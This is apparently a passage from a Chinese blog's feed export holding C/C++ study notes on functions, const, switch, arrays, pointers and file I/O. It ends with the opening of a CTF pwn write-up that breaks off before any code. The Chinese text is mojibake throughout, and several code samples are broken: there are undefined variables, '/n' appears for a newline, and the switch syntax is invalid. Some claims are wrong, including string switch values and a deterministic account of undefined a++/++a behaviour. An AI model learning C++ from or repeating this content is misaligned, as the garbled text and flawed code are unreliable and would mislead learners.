        <content type="html"><![CDATA[<h3 id="ä¼ å€¼ä¸ä¼ å€"><a href="#ä¼ å€¼ä¸ä¼ å€" class="headerlink" title="ä¼ å€¼ä¸ä¼ å€"></a>ä¼ å€¼ä¸ä¼ å€</h3><p>ä¼ å€¼ï¼šåªæ˜¯è®²å…¶çš„å€¼è¿›è¡Œå¤åˆ¶ï¼Œå†åœ¨å‡½æ•°é‡Œè¿›è¡Œæ”¹å˜ï¼Œä½†å®é™…ä¸Šï¼Œé‚£ä¸ªåœ°å€ä¸Šçš„å€¼æ²¡æœ‰ä»»ä½•å˜åŠ¨</p><p>åœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼šåˆ›å»ºä¸€å—æ ˆç©ºé—´ï¼Œä¿å­˜äº†è¿™ä¸ªæ¨¡å—ä¸­çš„å½¢å‚ï¼Œä¸€æ—¦å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œå°±ä¼špopã€‚</p><p>è¿‡ç¨‹å°±æ˜¯  sub   mov   add </p><p>å½“æˆ‘ä»¬å°†vec[ix]è¿™æ ·çš„å¯¹è±¡ä¼ å…¥å‡½æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹å…¶å€¼ä¼šè¢«å¤åˆ¶ä¸€ä»½ï¼Œæˆä¸ºæ„ä¹‰ä¸Šçš„å½¢å‚ã€‚</p><p>ä¼ å€ï¼šç›´æ¥å¯¹åœ°å€ä¸Šçš„å€¼è¿›è¡Œå˜åŠ¨</p><h3 id="inlineå‡½æ•°"><a href="#inlineå‡½æ•°" class="headerlink" title="inlineå‡½æ•°"></a>inlineå‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//å‡½æ•°å®šä¹‰ä¸ºinlineå³:å†…è”å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">char</span>* <span class="title">dbtest</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (i % <span class="number">2</span> &gt; <span class="number">0</span>) ? <span class="string">"å¥‡"</span> : <span class="string">"å¶"</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (i=<span class="number">1</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"i:%d    å¥‡å¶æ€§:%s /n"</span>, i, dbtest(i));    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä¾‹å­å°±æ˜¯æ ‡å‡†çš„å†…è”å‡½æ•°çš„ç”¨æ³•ï¼Œä½¿ç”¨inlineä¿®é¥°å¸¦æ¥çš„å¥½å¤„æˆ‘ä»¬è¡¨é¢çœ‹ä¸å‡ºæ¥ï¼Œå…¶å®ï¼Œåœ¨å†…éƒ¨çš„å·¥ä½œå°±æ˜¯åœ¨æ¯ä¸ªforå¾ªç¯çš„å†…éƒ¨ä»»ä½•è°ƒç”¨dbtest(i)çš„åœ°æ–¹éƒ½æ¢æˆäº†(i%2&gt;0)?â€å¥‡â€:â€å¶â€ï¼Œè¿™æ ·å°±<strong>é¿å…äº†é¢‘ç¹è°ƒç”¨å‡½æ•°å¯¹æ ˆå†…å­˜é‡å¤å¼€è¾Ÿæ‰€å¸¦æ¥çš„æ¶ˆè€—</strong>ã€‚</p><p>ï¼ˆä¸æ‡‚çš„å¯ä»¥æ‹¿pocå»gccï¼Œçœ‹æ±‡ç¼–åˆ†æï¼‰</p><h3 id="local-static"><a href="#local-static" class="headerlink" title="local static"></a>local static</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;*</span><br><span class="line"></span><br><span class="line">fibon_seq(<span class="keyword">int</span> size)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">static</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;elems;</span><br><span class="line"></span><br><span class="line">â€‹<span class="comment">//å‡½æ•°å·¥ä½œé€»è¾‘åœ¨æ­¤å¤„</span></span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">return</span> &amp;elem;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„elemè¢«å®šä¹‰ä¸ºå±€éƒ¨é™æ€å˜é‡ï¼Œå±€éƒ¨é™æ€å˜é‡çš„å«ä¹‰æ˜¯ï¼š å±€éƒ¨é™æ€å˜é‡æ‰€å¤„çš„å†…å­˜ç©ºé—´ï¼Œå³ä½¿åœ¨ä¸åŒçš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œä¾ç„¶æŒç»­å­˜åœ¨ã€‚</p><p>ä¾‹å­ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pch.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((size &lt;= <span class="number">0</span> || size &gt; <span class="number">64</span>) ? <span class="literal">false</span> : <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;*</span><br><span class="line">Pentagonal_series(<span class="keyword">int</span> pos)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; _elems;</span><br><span class="line"><span class="keyword">if</span> (check(pos) &amp;&amp; (pos &gt; _elems.size()))</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> ix = _elems.size() + <span class="number">1</span>; ix &lt;= pos; ix++)</span><br><span class="line">_elems.push_back((ix * (<span class="number">3</span> * ix - <span class="number">1</span>)) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> &amp;_elems;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//â†“ pentå°±ä¸ºå±€éƒ¨é™æ€å˜é‡ï¼Œè¢«èµ‹å€¼ç»™äº†elemï¼Œåœ¨mainä¸­ä¾ç„¶å¯ä»¥è¿›è¡Œè¾“å‡ºæ“ä½œ</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Pentagonal</span><span class="params">(<span class="keyword">int</span> size, <span class="keyword">int</span> &amp;elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!check(size))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"sorry!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">elem = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; *pent = Pentagonal_series(size);</span><br><span class="line">elem = (*pent)[size - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> elem;</span><br><span class="line"><span class="keyword">if</span> (Pentagonal(<span class="number">8</span>, elem))</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"element 8 is "</span> &lt;&lt; elem &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°é‡è½½"><a href="#å‡½æ•°é‡è½½" class="headerlink" title="å‡½æ•°é‡è½½"></a>å‡½æ•°é‡è½½</h3><p>å‡½æ•°åå¯ä»¥ç›¸åŒï¼Œå‚æ•°ä¸åŒï¼ˆç±»å‹ï¼Œä¸ªæ•°ï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c++å­¦ä¹ ç¬”è®°ï¼ˆc++ç¼–ç¨‹åŸºç¡€ï¼‰</title>
      <link href="/2019/10/18/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%EF%BC%88c++%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%EF%BC%89/"/>
      <url>/2019/10/18/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%EF%BC%88c++%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="using-namespace"><a href="#using-namespace" class="headerlink" title="using namespace"></a>using namespace</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span></span><br></pre></td></tr></table></figure><p>å½¢è±¡é€šä¿—çš„è®²ï¼Œå°±æ˜¯ä¸ºäº†é˜²æ­¢åŒæ–‡ä»¶ä¸­åŒå˜é‡åæˆ–å‡½æ•°åäº§ç”Ÿå†²çªï¼Œåªè¦å®ƒä»¬å±äºä¸åŒçš„åç©ºé—´</p><h3 id="const"><a href="#const" class="headerlink" title="const"></a>const</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> max_tries = <span class="number">3</span> ;</span><br></pre></td></tr></table></figure><p>è¢«å®šä¹‰ä¸ºconstçš„å¯¹è±¡ï¼Œåœ¨è·å¾—åˆå€¼ä»¥åï¼Œæ— æ³•å†æœ‰ä»»ä½•æ”¹åŠ¨ã€‚å¦‚æœä½ ä¼å›¾ä¸ºconstå¯¹è±¡æŒ‡å®šæ–°å€¼ï¼Œä¼šäº§ç”Ÿç¼–è¯‘é”™è¯¯ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_tries = <span class="number">41</span> ; <span class="comment">//é”™è¯¯ï¼šè¿™æ˜¯ä¸ªconstå¯¹è±¡</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€åˆ‡çš„å‰æéƒ½æ˜¯å»ºç«‹åœ¨c++åŸºç¡€ä¸Šï¼Œåœ¨cä¸­çš„constæ˜¯ä¼ªå¸¸é‡ï¼Œå¯ä»¥é€šè¿‡æŒ‡é’ˆä¿®æ”¹ï¼Œc++é‡Œconstæ— æ³•é€šè¿‡æŒ‡é’ˆä¿®æ”¹ï¼ˆæ„Ÿè°¢Delortå¸ˆå‚…çš„ä¼ æˆï¼‰</p><h3 id="æ¡ä»¶è¿ç®—ç¬¦-â€˜-â€™-å’Œâ€™-â€™"><a href="#æ¡ä»¶è¿ç®—ç¬¦-â€˜-â€™-å’Œâ€™-â€™" class="headerlink" title="æ¡ä»¶è¿ç®—ç¬¦ â€˜?â€™ å’Œâ€™:â€™"></a>æ¡ä»¶è¿ç®—ç¬¦ â€˜?â€™ å’Œâ€™:â€™</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> line_size = <span class="number">8</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cnt =<span class="number">1</span> ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a_string</span><br><span class="line"></span><br><span class="line"> &lt;&lt; ( cnt % line_size ?  '  '  :  '\n'  ) ;</span><br></pre></td></tr></table></figure><p>æ¡ä»¶è¿ç®—ç¬¦çš„ä¸€èˆ¬ä½¿ç”¨å½¢å¼å¦‚ä¸‹ï¼š</p><p>â€‹    expr</p><p>â€‹        ?  å¦‚æœexpr ä¸º true ï¼Œ å°±æ‰§è¡Œè¿™é‡Œ</p><p>â€‹        :  å¦‚æœexpr ä¸º false ï¼Œ å°±æ‰§è¡Œè¿™é‡Œ</p><p>å¦‚ä½•åˆ¤å®š true ä¸ falseå‘¢ï¼Œæ­¤ä¾‹å°±æ˜¯çœ‹ä¸Šé¢æ¡ä»¶è¡¨è¾¾å¼ æ˜¯å¦ä¸º0ï¼Œ0ä¸ºfalseï¼Œå…¶ä½™ä¸ºtrueã€‚</p><h3 id="å¾ªç¯è¯­å¥ä¹‹switch"><a href="#å¾ªç¯è¯­å¥ä¹‹switch" class="headerlink" title="å¾ªç¯è¯­å¥ä¹‹switch"></a>å¾ªç¯è¯­å¥ä¹‹switch</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>( <span class="keyword">int</span> number || <span class="keyword">char</span> <span class="built_in">string</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line"></span><br><span class="line">â€‹è¯­å¥å— ;</span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line"></span><br><span class="line">â€‹è¯­å¥å— ;</span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">case</span> ......</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span> :</span><br><span class="line">        è¯­å¥å— ;</span><br><span class="line">        <span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>switch () ä¸­è¡¨è¾¾å¼çš„å€¼å¿…é¡»ä¸ºæ•´æ•°æˆ–è€…å­—ç¬¦ä¸²</p></li><li><p>è¡¨è¾¾å¼çš„å€¼ä¾æ¬¡ä¸case è¿›è¡Œæ¯”è¾ƒï¼Œç¬¦åˆä¾¿æ‰§è¡Œè¯¥caseï¼Œå…¨æ²¡ç¬¦åˆï¼Œå¦‚æœæœ‰defaultï¼Œä¾¿å¼€å§‹æ‰§è¡Œdefault ï¼Œå¦‚æœdefaultä¹Ÿæ²¡æœ‰ï¼Œå°±ä¸æ‰§è¡Œä»»ä½•æ“ä½œ</p></li><li><p>å¦‚æœä¸åœ¨caseååŠ ä¸Šbreakï¼Œä¸€æ—¦åœ¨ä¸­é—´åŒ¹é…åˆ°ä¸€ä¸ªcaseè¿›è¡Œï¼Œå‰©ä¸‹çš„caseå…¨ä¼šä¾æ¬¡æ‰§è¡Œï¼ï¼ï¼ï¼ï¼</p></li></ol><h3 id="Arrayå’ŒVector-æ•°ç»„"><a href="#Arrayå’ŒVector-æ•°ç»„" class="headerlink" title="Arrayå’ŒVector æ•°ç»„"></a>Arrayå’ŒVector æ•°ç»„</h3><h4 id="Array"><a href="#Array" class="headerlink" title="Array :"></a>Array :</h4><ol><li>å¿…é¡»æŒ‡å®šå…ƒç´ ç±»å‹ï¼Œåç§°ï¼Œå¤§å°</li></ol><p>â€‹       Arrayçš„å¤§å°å¿…é¡»æ˜¯ä¸ªå¸¸é‡è¡¨è¾¾å¼ï¼Œä¹Ÿå°±æ˜¯ä¸éœ€è¦åœ¨è¿è¡Œæ—¶æ±‚å€¼çš„è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> seq_size = <span class="number">18</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pell_seq[ seq_size ];</span><br></pre></td></tr></table></figure><ol start="2"><li>æ”¯æŒç»Ÿä¸€èµ‹å€¼</li></ol><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector :"></a>Vector :</h4><ol><li><p>å¿…é¡»åŒ…å«vectorå¤´æ–‡ä»¶</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; pell_seq[seq_size] ;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>æ­¤å¤„çš„seq_size ä¸ä¸€å®šå¾—æ˜¯ä¸ªå¸¸é‡è¡¨è¾¾å¼</p></li><li><p>ä¸æ”¯æŒç»Ÿä¸€èµ‹å€¼</p><p>å¯ä»¥è¿›è¡Œå†—é•¿çš„é€ä¸ªèµ‹å€¼</p><p>æˆ–è€…åˆ©ç”¨å·²ç»åˆå§‹åŒ–çš„Arrayä½œä¸ºVectorçš„åˆå€¼</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">int</span> elem_vals[seq_size] =</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line">   â€‹<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span></span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//ä»¥elem_valsçš„å€¼æ¥åˆå§‹åŒ–elem_seq</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; elem_seq( elem_vals, elem_vals+seq_size ) ;</span><br></pre></td></tr></table></figure></li></ol><p>è¿˜å¾—æ³¨æ„ä¸€ç‚¹ï¼Œä¸¥ç¦off by oneï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</p><p>off by oneçš„å±å®³ï¼Œå¯ä»¥å»å¦ä¸€ç¯‡buuåˆ·é¢˜ä¹‹æ—…æŸ¥çœ‹</p><h3 id="æŒ‡é’ˆ"><a href="#æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆ"></a>æŒ‡é’ˆ</h3><p>æŒ‡é’ˆçš„æé¢†æ“ä½œï¼š</p><p>å¦‚æœè¦è®¿é—®ä¸€ä¸ªç”±æŒ‡é’ˆæ‰€æŒ‡å¯¹è±¡ï¼Œå¾—æé¢†ï¼Œä¹Ÿå°±æ˜¯å–å¾— â€œä½äºè¯¥æŒ‡é’ˆæ‰€æŒ‡å†…å­˜åœ°å€ä¸Šâ€ çš„å¯¹è±¡ã€‚ åœ¨æŒ‡é’ˆå‰ç”¨*</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ival = <span class="number">1024</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> * pi ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *pi = &amp;ival ; <span class="comment">//piåˆå€¼è®¾ç½®ä¸ºivalæ‰€åœ¨çš„å†…å­˜åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æé¢†piï¼Œå€Ÿä»¥è®¿é—®å®ƒæ‰€æŒ‡å‘çš„å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  ( *pi ! =<span class="number">1024</span> )  <span class="comment">// è¯»å–ivalçš„å€¼</span></span><br><span class="line"></span><br><span class="line">â€‹*pi = <span class="number">1024</span> ;  <span class="comment">//å†™å€¼åˆ° ival</span></span><br></pre></td></tr></table></figure><h4 id="æ³¨ï¼š"><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a>æ³¨ï¼š</h4><p>â€‹    </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> pi ;  <span class="comment">//è®¡ç®—å­˜æ”¾p1æŒ‡é’ˆçš„åœ°å€é‡Œçš„å†…å®¹</span></span><br><span class="line">&amp;pi ;  <span class="comment">//æŒ‡å­˜æ”¾piæŒ‡é’ˆçš„åœ°å€</span></span><br><span class="line">*pi ;  <span class="comment">//æŒ‡piæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€é‡Œçš„å†…å®¹ï¼Œç­‰äºæ˜¯æ“ä½œpiæ‰€æŒ‡çš„å¯¹è±¡ã€‚</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*pi ;  <span class="comment">// æ±‚ivalçš„å€¼</span></span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶çš„è¯»å†™"><a href="#æ–‡ä»¶çš„è¯»å†™" class="headerlink" title="æ–‡ä»¶çš„è¯»å†™"></a>æ–‡ä»¶çš„è¯»å†™</h3><p>å¤´æ–‡ä»¶</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br></pre></td></tr></table></figure><p>æ‰“å¼€å¯ä¾›å†™å…¥çš„æ–‡ä»¶</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ofstream outfile ( "æ–‡ä»¶å")ï¼›</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š æ­¤ä¸¾ä¼šä½¿æ–‡ä»¶ä¸­åŸæœ‰æ•°æ®å…¨éƒ¨æ¸…ç©º</p><p>è¿½åŠ æ¨¡å¼å†™å…¥æ–‡ä»¶ï¼ˆä¼šå†™åœ¨æ–‡ä»¶æœ«å°¾ï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">outfile</span><span class="params">(<span class="string">"æ–‡ä»¶å"</span> , ios_base::app)</span></span>;</span><br></pre></td></tr></table></figure><p>è¯»å–æ–‡ä»¶</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">"æ–‡ä»¶å"</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š ä»å¼€å¤´å¼€å§‹è¯»å–</p><h3 id="â€˜-â€˜-amp-â€œ-â€œ"><a href="#â€˜-â€˜-amp-â€œ-â€œ" class="headerlink" title="â€˜  â€˜ &amp; â€œ  â€œ"></a>â€˜  â€˜ &amp; â€œ  â€œ</h3><p>â€˜aâ€™ä»£è¡¨äº†å­—æ¯a</p><p>â€œaâ€ä»£è¡¨äº†ä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œè¯¥æ•°ç»„åŒ…å«ä¸¤ä¸ªå­—ç¬¦ï¼š 1. a      2. â€˜\x00â€™</p><p>a++ ä¸ ++açš„ç¨è®¸å·®åˆ«</p><h3 id="a-ä¸-açš„ç¨è®¸å·®åˆ«"><a href="#a-ä¸-açš„ç¨è®¸å·®åˆ«" class="headerlink" title="a++ ä¸ ++açš„ç¨è®¸å·®åˆ«"></a>a++ ä¸ ++açš„ç¨è®¸å·®åˆ«</h3><p>å¯¹äºa++ï¼Œå®ƒå…ˆæ‹·è´è‡ªå·±çš„å‰¯æœ¬ï¼Œç„¶åå¯¹çœŸå€¼+1ã€‚</p><p>å¯¹äº++a,å®ƒåªæ˜¯åœ¨çœŸå€¼ä¸Š+1/</p><p>å¦‚test1</p><p>a=1;</p><table><thead><tr><th>æ ˆ</th><th>è¿ç®—å¼</th><th>çœŸå€¼</th><th>å‰¯æœ¬</th></tr></thead><tbody><tr><td>ä½ä½</td><td>a++</td><td>7</td><td>6</td></tr><tr><td></td><td>++a</td><td>6</td><td>æ— </td></tr><tr><td></td><td>a++</td><td>5</td><td>4</td></tr><tr><td></td><td>++a</td><td>4</td><td>æ— </td></tr><tr><td></td><td>a++</td><td>3</td><td>2</td></tr><tr><td>é«˜ä½</td><td>++a</td><td>2</td><td>æ— </td></tr></tbody></table><p>æ­¤æ—¶ï¼Œaçš„çœŸå€¼ä¸º7ï¼Œè‡ªä½ä½è¾“å‡ºï¼Œå¦‚æœ‰å‰¯æœ¬åˆ™è¾“å‡ºå‰¯æœ¬ï¼Œæ— å‰¯æœ¬è¾“å‡ºç°åœ¨açš„çœŸå€¼7</p><p>ç»“æœï¼š 6 7 4 7 2 7</p><p>ï¼ˆè¿™é‡Œå¾—æ„Ÿè°¢Delortå¸ˆå‚…çš„æ–‡ç« ï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>byte ctf (pwn)</title>
      <link href="/2019/10/18/byte%20ctf%20(pwn)/"/>
      <url>/2019/10/18/byte%20ctf%20(pwn)/</url>
      
        <content type="html"><![CDATA[<h3 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote"></a>mulnote</h3><p>ç®€å•çš„ç»„åˆæ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 